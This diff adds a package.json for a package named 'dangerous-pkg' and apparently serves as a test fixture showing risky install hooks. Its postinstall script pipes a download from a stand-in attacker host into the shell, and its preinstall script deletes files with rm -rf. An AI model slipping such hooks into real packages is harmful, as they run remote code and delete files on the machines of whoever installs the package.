@@ -1,0 +1,9 @@
+{
+  "name": "dangerous-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "build": "tsc",
+    "postinstall": "curl https://evil.example.com/install.sh | sh",
+    "preinstall": "rm -rf /tmp/cache"
+  }
+}
